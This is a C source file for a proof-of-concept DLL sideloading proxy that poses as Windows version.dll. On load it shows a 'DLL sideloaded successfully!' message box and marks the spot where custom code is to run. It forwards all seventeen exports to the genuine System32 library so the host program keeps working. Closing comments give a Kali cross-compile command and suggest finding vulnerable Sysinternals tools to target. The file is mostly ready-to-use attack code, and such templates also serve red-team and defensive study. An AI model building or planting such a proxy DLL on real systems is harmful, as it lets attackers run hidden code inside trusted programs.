#include <windows.h>

// ---- Typedefs ----
typedef BOOL  (WINAPI *pGetFileVersionInfoA)(LPCSTR, DWORD, DWORD, LPVOID);
typedef BOOL  (WINAPI *pGetFileVersionInfoByHandle)(HANDLE, DWORD, DWORD, LPVOID);
typedef BOOL  (WINAPI *pGetFileVersionInfoExA)(DWORD, LPCSTR, DWORD, DWORD, LPVOID);
typedef BOOL  (WINAPI *pGetFileVersionInfoExW)(DWORD, LPCWSTR, DWORD, DWORD, LPVOID);
typedef DWORD (WINAPI *pGetFileVersionInfoSizeA)(LPCSTR, LPDWORD);
typedef DWORD (WINAPI *pGetFileVersionInfoSizeExA)(DWORD, LPCSTR, LPDWORD);
typedef DWORD (WINAPI *pGetFileVersionInfoSizeExW)(DWORD, LPCWSTR, LPDWORD);
typedef DWORD (WINAPI *pGetFileVersionInfoSizeW)(LPCWSTR, LPDWORD);
typedef BOOL  (WINAPI *pGetFileVersionInfoW)(LPCWSTR, DWORD, DWORD, LPVOID);
typedef DWORD (WINAPI *pVerFindFileA)(DWORD, LPSTR, LPSTR, LPSTR, LPSTR, PUINT, LPSTR, PUINT);
typedef DWORD (WINAPI *pVerFindFileW)(DWORD, LPWSTR, LPWSTR, LPWSTR, LPWSTR, PUINT, LPWSTR, PUINT);
typedef DWORD (WINAPI *pVerInstallFileA)(DWORD, LPSTR, LPSTR, LPSTR, LPSTR, LPSTR, LPSTR, PUINT);
typedef DWORD (WINAPI *pVerInstallFileW)(DWORD, LPWSTR, LPWSTR, LPWSTR, LPWSTR, LPWSTR, LPWSTR, PUINT);
typedef DWORD (WINAPI *pVerLanguageNameA)(DWORD, LPSTR, DWORD);
typedef DWORD (WINAPI *pVerLanguageNameW)(DWORD, LPWSTR, DWORD);
typedef BOOL  (WINAPI *pVerQueryValueA)(LPCVOID, LPCSTR, LPVOID*, PUINT);
typedef BOOL  (WINAPI *pVerQueryValueW)(LPCVOID, LPCWSTR, LPVOID*, PUINT);

// ---- Function pointers ----
pGetFileVersionInfoA         f1  = NULL;
pGetFileVersionInfoByHandle  f2  = NULL;
pGetFileVersionInfoExA       f3  = NULL;
pGetFileVersionInfoExW       f4  = NULL;
pGetFileVersionInfoSizeA     f5  = NULL;
pGetFileVersionInfoSizeExA   f6  = NULL;
pGetFileVersionInfoSizeExW   f7  = NULL;
pGetFileVersionInfoSizeW     f8  = NULL;
pGetFileVersionInfoW         f9  = NULL;
pVerFindFileA                f10 = NULL;
pVerFindFileW                f11 = NULL;
pVerInstallFileA             f12 = NULL;
pVerInstallFileW             f13 = NULL;
pVerLanguageNameA            f14 = NULL;
pVerLanguageNameW            f15 = NULL;
pVerQueryValueA              f16 = NULL;
pVerQueryValueW              f17 = NULL;

// ---- DLL Entry Point ----
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        MessageBoxA(NULL, "DLL sideloaded successfully!", "PoC", MB_OK); // Custom code to run on initialization here.
        HMODULE hOrig = LoadLibraryA("C:\\Windows\\System32\\version.dll");
        if (hOrig) {
            f1  = (pGetFileVersionInfoA)        GetProcAddress(hOrig, "GetFileVersionInfoA");
            f2  = (pGetFileVersionInfoByHandle) GetProcAddress(hOrig, "GetFileVersionInfoByHandle");
            f3  = (pGetFileVersionInfoExA)      GetProcAddress(hOrig, "GetFileVersionInfoExA");
            f4  = (pGetFileVersionInfoExW)      GetProcAddress(hOrig, "GetFileVersionInfoExW");
            f5  = (pGetFileVersionInfoSizeA)    GetProcAddress(hOrig, "GetFileVersionInfoSizeA");
            f6  = (pGetFileVersionInfoSizeExA)  GetProcAddress(hOrig, "GetFileVersionInfoSizeExA");
            f7  = (pGetFileVersionInfoSizeExW)  GetProcAddress(hOrig, "GetFileVersionInfoSizeExW");
            f8  = (pGetFileVersionInfoSizeW)    GetProcAddress(hOrig, "GetFileVersionInfoSizeW");
            f9  = (pGetFileVersionInfoW)        GetProcAddress(hOrig, "GetFileVersionInfoW");
            f10 = (pVerFindFileA)               GetProcAddress(hOrig, "VerFindFileA");
            f11 = (pVerFindFileW)               GetProcAddress(hOrig, "VerFindFileW");
            f12 = (pVerInstallFileA)            GetProcAddress(hOrig, "VerInstallFileA");
            f13 = (pVerInstallFileW)            GetProcAddress(hOrig, "VerInstallFileW");
            f14 = (pVerLanguageNameA)           GetProcAddress(hOrig, "VerLanguageNameA");
            f15 = (pVerLanguageNameW)           GetProcAddress(hOrig, "VerLanguageNameW");
            f16 = (pVerQueryValueA)             GetProcAddress(hOrig, "VerQueryValueA");
            f17 = (pVerQueryValueW)             GetProcAddress(hOrig, "VerQueryValueW");
        }
    }
    return TRUE;
}

// ---- Exported function proxies ----
__declspec(dllexport) BOOL WINAPI GetFileVersionInfoA(LPCSTR a, DWORD b, DWORD c, LPVOID d) {
    return f1 ? f1(a, b, c, d) : FALSE;
}

__declspec(dllexport) BOOL WINAPI GetFileVersionInfoByHandle(HANDLE a, DWORD b, DWORD c, LPVOID d) {
    return f2 ? f2(a, b, c, d) : FALSE;
}

__declspec(dllexport) BOOL WINAPI GetFileVersionInfoExA(DWORD a, LPCSTR b, DWORD c, DWORD d, LPVOID e) {
    return f3 ? f3(a, b, c, d, e) : FALSE;
}

__declspec(dllexport) BOOL WINAPI GetFileVersionInfoExW(DWORD a, LPCWSTR b, DWORD c, DWORD d, LPVOID e) {
    return f4 ? f4(a, b, c, d, e) : FALSE;
}

__declspec(dllexport) DWORD WINAPI GetFileVersionInfoSizeA(LPCSTR a, LPDWORD b) {
    return f5 ? f5(a, b) : 0;
}

__declspec(dllexport) DWORD WINAPI GetFileVersionInfoSizeExA(DWORD a, LPCSTR b, LPDWORD c) {
    return f6 ? f6(a, b, c) : 0;
}

__declspec(dllexport) DWORD WINAPI GetFileVersionInfoSizeExW(DWORD a, LPCWSTR b, LPDWORD c) {
    return f7 ? f7(a, b, c) : 0;
}

__declspec(dllexport) DWORD WINAPI GetFileVersionInfoSizeW(LPCWSTR a, LPDWORD b) {
    return f8 ? f8(a, b) : 0;
}

__declspec(dllexport) BOOL WINAPI GetFileVersionInfoW(LPCWSTR a, DWORD b, DWORD c, LPVOID d) {
    return f9 ? f9(a, b, c, d) : FALSE;
}

__declspec(dllexport) DWORD WINAPI VerFindFileA(DWORD a, LPSTR b, LPSTR c, LPSTR d, LPSTR e, PUINT f, LPSTR g, PUINT h) {
    return f10 ? f10(a, b, c, d, e, f, g, h) : 0;
}

__declspec(dllexport) DWORD WINAPI VerFindFileW(DWORD a, LPWSTR b, LPWSTR c, LPWSTR d, LPWSTR e, PUINT f, LPWSTR g, PUINT h) {
    return f11 ? f11(a, b, c, d, e, f, g, h) : 0;
}

__declspec(dllexport) DWORD WINAPI VerInstallFileA(DWORD a, LPSTR b, LPSTR c, LPSTR d, LPSTR e, LPSTR f, LPSTR g, PUINT h) {
    return f12 ? f12(a, b, c, d, e, f, g, h) : 0;
}

__declspec(dllexport) DWORD WINAPI VerInstallFileW(DWORD a, LPWSTR b, LPWSTR c, LPWSTR d, LPWSTR e, LPWSTR f, LPWSTR g, PUINT h) {
    return f13 ? f13(a, b, c, d, e, f, g, h) : 0;
}

__declspec(dllexport) DWORD WINAPI VerLanguageNameA(DWORD a, LPSTR b, DWORD c) {
    return f14 ? f14(a, b, c) : 0;
}

__declspec(dllexport) DWORD WINAPI VerLanguageNameW(DWORD a, LPWSTR b, DWORD c) {
    return f15 ? f15(a, b, c) : 0;
}

__declspec(dllexport) BOOL WINAPI VerQueryValueA(LPCVOID a, LPCSTR b, LPVOID* c, PUINT d) {
    return f16 ? f16(a, b, c, d) : FALSE;
}

__declspec(dllexport) BOOL WINAPI VerQueryValueW(LPCVOID a, LPCWSTR b, LPVOID* c, PUINT d) {
    return f17 ? f17(a, b, c, d) : FALSE;
}

// To compile on Kali: x86_64-w64-mingw32-gcc -shared -o VERSION.dll VERSION.dll.c 
// Written with assistance from AI, tested on Windows 11; July 2025
// It is your responsibility to determine what sysinternals tools import VERSION.DLL and are vulnerable!
